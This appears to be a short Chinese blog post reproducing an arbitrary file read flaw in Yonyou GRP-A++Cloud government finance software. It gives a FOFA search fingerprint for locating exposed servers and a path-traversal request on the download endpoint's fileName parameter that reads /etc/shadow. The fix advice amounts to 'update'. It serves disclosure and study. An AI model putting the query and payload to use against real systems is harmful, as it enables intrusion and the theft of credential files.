[toc]

# 免责声明
文章只供交流与学习，切莫做违法犯罪的事情
# 漏洞描述
用友 GRP-A++Cloud 政府财务云产品是以政府会计准则和预算管理一体化规范为基准，服务于政府行政事业单位，落实国家信创和行政事业单位内部控制规范要求，支持省级集中部署以及内部、外部业务协同，通过构建云原生服务，支撑业务的持续演化和变革，为政府业财一体化、财务规范化、自动化、智能化服务，打造安全、可靠、可控的信息化运行环境，提升各单位数字化治理能力。

# 漏洞原理
在download页面参数为fileName处存在任意文件的读取漏洞
# 影响版本
不详

# fofa

body="/pf/portal/login/css/fonts/style.css"

# 漏洞复现
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/624cf65f50a34e369cab30c74d58df70.png)
访问/ma/emp/maEmp/download?fileName=../../../etc/shadow
![在这里插入图片描述](https://img-blog.csdnimg.cn/direct/e3e2fad6e7924a1d87333d158e116144.png)

# 修复建议
更新到最新版本

